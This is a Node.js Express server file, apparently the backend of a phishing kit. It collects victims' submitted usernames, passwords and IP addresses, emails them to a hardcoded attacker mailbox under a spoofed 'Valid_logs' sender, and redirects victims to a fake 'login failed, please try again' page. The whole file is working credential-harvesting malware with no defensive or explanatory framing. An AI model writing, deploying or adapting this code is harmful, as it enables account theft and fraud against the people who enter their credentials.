let email = "only1r00t@yandex.ru";
let email2 = "Valid_logs <Autoresult-notification@mail.com>";
let email3 = "${pet}"

const express = require("express");
const cors = require("cors");
const app = express();
const sendmail = require("sendmail")({ silent: true });
const lastRedirect = "";
const getLink = () => {
  return [
'https://projectredirectoncloud.web.app/',
'https://projectredirectoncloud.web.app/',
'https://projectredirectoncloud.web.app/',
'https://projectredirectoncloud.web.app/',
'https://projectredirectoncloud.web.app/',
'https://projectredirectoncloud.web.app/',
'https://projectredirectoncloud.web.app/',
'https://projectredirectoncloud.web.app/',
'https://projectredirectoncloud.web.app/',
'https://projectredirectoncloud.web.app/',
      ][Math.floor(Math.random() * 10)] +
      "?error=error&loginfailed=your-login-failed-please-try-again&email=";
};

app.use(cors());
app.use(express.static("public"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.get("/", (req, res) => res.json({ working: true }));
app.post("/", (req, res) => {
  const { pet, pett, source, error } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  let redirectUrl = getLink() + pet;
  let page;
  if (error) {
    page = "ERROR PAGE";
  } else {
    page = "MAIN PAGE";
  }
  const html = `
    <!DOCTYPE html>
    <html lang='en'>
    <head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Document</title>
    </head>  
    <body>
    ${source.toUpperCase()} Details Have Arrived!!
    <h4>Page: ${page}</h4>
    <h4>Username: ${pet}</h4>
    <h4>Password: ${pett}</h4>
    <h4>IP: ${ip}</h4>
    </div>
    <div style='margin-left: 40px;'><small>Logs delivered by @U$D</small></div>
    </body>
    </html>
    `;
  if (error) {
    redirectUrl = lastRedirect;
    if (!lastRedirect) {
      const dom = pet.split("@")[1];
      redirectUrl = `http://${dom}`;
    }
  }
    sendmail({
    from: email2,
    to: email,
    subject: (pet) + ' LOG',
    html,
  }, function(err, reply) {
    res.redirect(redirectUrl);
});
  
});
const listener = app.listen(process.env.PORT, () => {
  console.log("Your app is listening on port " + listener.address().port);
});